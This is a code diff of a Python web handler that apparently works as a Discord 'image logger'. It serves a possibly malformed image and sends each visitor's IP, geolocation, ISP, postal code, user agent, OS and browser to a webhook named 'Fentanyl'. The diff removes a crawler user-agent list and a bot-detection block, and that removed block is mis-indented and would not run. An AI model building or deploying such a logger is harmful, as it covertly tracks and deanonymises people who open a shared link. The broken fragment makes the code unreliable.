@@ -8,21 +8,6 @@ bindata = httpx.get('https://a.pinatafarm.com/420x498/c6bb89155c/flight-scared-a
 buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
-KNOWN_BOT_UA_TOKENS = [
-    "discordbot", "telegrambot", "facebookexternalhit", "slackbot",
-    "twitterbot", "googlebot", "bingbot", "yandexbot", "duckduckbot", "baiduspider"
-]
-
-def bot_preview_payload(agent: str):
-    return {
-        "username": "Preview Monitor",
-        "embeds": [{
-            "title": "Platform bot previewed the image",
-            "description": f"User-Agent:\n```yaml\n{agent}\n```",
-            "color": 0x5865F2
-        }]
-    }
-
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
   "username": "Fentanyl",
@@ -70,15 +55,6 @@ def prev(ip,uag):
 }
 
 class handler(BaseHTTPRequestHandler):
-ua = self.headers.get("user-agent") or ""
-if any(t in ua.lower() for t in KNOWN_BOT_UA_TOKENS):
-    self.send_response(200); self.send_header("Content-type","image/jpeg"); self.end_headers()
-    self.wfile.write(buggedbin if buggedimg else bindata)
-    try:
-        httpx.post(webhook, json=bot_preview_payload(ua), timeout=5)
-    except Exception:
-        pass
-    return
     def do_GET(self):
         s = self.path
         dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
